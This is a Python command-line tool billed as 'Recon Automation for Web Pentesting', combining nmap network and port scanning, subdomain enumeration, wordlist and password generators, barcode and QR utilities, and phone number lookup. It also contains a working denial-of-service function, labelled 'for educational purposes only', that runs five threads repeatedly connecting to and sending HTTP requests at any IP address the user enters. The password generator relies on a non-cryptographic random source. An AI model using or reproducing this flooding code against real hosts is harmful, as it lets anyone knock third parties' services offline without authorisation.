import socket
import threading
import nmap
import barcode
from barcode.writer import ImageWriter
import qrcode
from qrcode import constants
import random
import string
import itertools
import phonenumbers
from phonenumbers import geocoder, carrier
import os
import subprocess
import sys

def main():
    while True:
        print("\n*** Recon Automation for Web Pentesting ***")
        print("1. IP Scanner")
        print("2. Port Scanner")
        print("3. Barcode Generator")
        print("4. QR Code Generator")
        print("5. Password Generator")
        print("6. Wordlist Generator")
        print("7. Phone Number Information")
        print("8. Subdomain Checker")
        print("9. DDOS Attack Tool (for educational purposes only)")
        print("10. Exit")
        
        choice = input("Enter your choice (1-10): ").strip()

        if choice == "1":
            network = input("Enter the network range (e.g., 192.168.1.0/24): ").strip()
            ip_list = ip_scanner(network)
            print("\nActive IP addresses:")
            for ip in ip_list:
                print(ip)

        elif choice == "2":
            host = input("Enter the hostname or IP address of the target: ").strip()
            port_scanner(host)

        elif choice == "3":
            data = input("Enter the data for the barcode: ").strip()
            barcode_type = input("Enter the barcode type (e.g., code39, code128): ").strip()
            generate_barcode(data, barcode_type)
            print(f"Barcode image saved as {data}_{barcode_type}.png")

        elif choice == "4":
            data = input("Enter the data for the QR code: ").strip()
            filename = input("Enter the filename for the QR code image (e.g., qr_code.png): ").strip()
            generate_qr(data, filename)
            print(f"QR code image saved as {filename}")

        elif choice == "5":
            length = int(input("Enter the desired length for the password (default: 12): ") or "12")
            password = generate_password(length)
            print(f"Generated password: {password}")

        elif choice == "6":
            words = input("Enter the words to use in the wordlist (separated by spaces): ").split()
            filename = input("Enter the filename for the wordlist (e.g., wordlist.txt): ").strip()
            generate_wordlist(words, filename)
            print(f"Wordlist saved as {filename}")

        elif choice == "7":
            number = input("Enter the phone number (e.g., +41123456789): ").strip()
            phone_info(number)

        elif choice == "8":
            domain = input("Enter the domain name: ").strip()
            subdomain_checker(domain)

        elif choice == "9":
            ddos_target = input("Enter the IP address for the DDOS attack (educational purposes only): ").strip()
            ddos_attack(ddos_target)

        elif choice == "10":
            print("Exiting...")
            break

        else:
            print("Invalid choice. Please try again.")


def ip_scanner(network):
    ip_list = []
    nm = nmap.PortScanner()
    print(f"Scanning network range: {network}")
    nm.scan(hosts=network, arguments='-sn')
    for host in nm.all_hosts():
        if nm[host].state() == "up":
            ip_list.append(host)
    return ip_list


def port_scanner(target):
    scanner = nmap.PortScanner()
    print(f"\nScanning ports on target: {target}")
    scanner.scan(target)
    for host in scanner.all_hosts():
        print(f"Host: {host} ({scanner[host].hostname()})")
        print("State:", scanner[host].state())
        for proto in scanner[host].all_protocols():
            print(f"Protocol: {proto}")
            lport = sorted(scanner[host][proto].keys())
            for port in lport:
                print(f"Port: {port}\tService: {scanner[host][proto][port]['name']}\tState: {scanner[host][proto][port]['state']}")


def generate_barcode(data, barcode_type='code39'):
    try:
        code = barcode.get_barcode_class(barcode_type)
        code = code(data, writer=ImageWriter())
        filename = f'{data}_{barcode_type}.png'
        code.save(filename)
    except Exception as e:
        print(f"Error generating barcode: {e}")


def generate_qr(data, filename):
    qr = qrcode.QRCode(
        version=1,
        error_correction=constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(filename)


def generate_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))


def generate_wordlist(words, filename):
    with open(filename, 'w') as f:
        for word in itertools.product(words, repeat=3):
            f.write(''.join(word) + '\n')


def phone_info(number):
    try:
        parsed_number = phonenumbers.parse(number, "CH")
        country = geocoder.description_for_number(parsed_number, "en")
        provider = carrier.name_for_number(parsed_number, "en")
        print(f"Country: {country}")
        print(f"Provider: {provider}")
    except phonenumbers.phonenumberutil.NumberParseException:
        print("Invalid phone number format.")


def subdomain_checker(domain):
    try:
        print(f"Running subdomain check for {domain}...")
        subprocess.run(["sublist3r", "-d", domain], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")


def ddos_attack(target_ip):
    port = 80  # Common HTTP port, but can be customized
    fake_ip = "182.21.20.32"
    attack_num = 0

    print(f"Starting DDOS attack simulation on {target_ip}...")
    def attack():
        nonlocal attack_num
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))
                s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
                
                attack_num += 1
                print(f"Attack count: {attack_num}")
                
                s.close()
            except KeyboardInterrupt:
                print("Stopping attack...")
                break

    for i in range(5):  # Limit threads for demonstration; can increase but use responsibly.
        thread = threading.Thread(target=attack)
        thread.start()


if __name__ == "__main__":
    main()
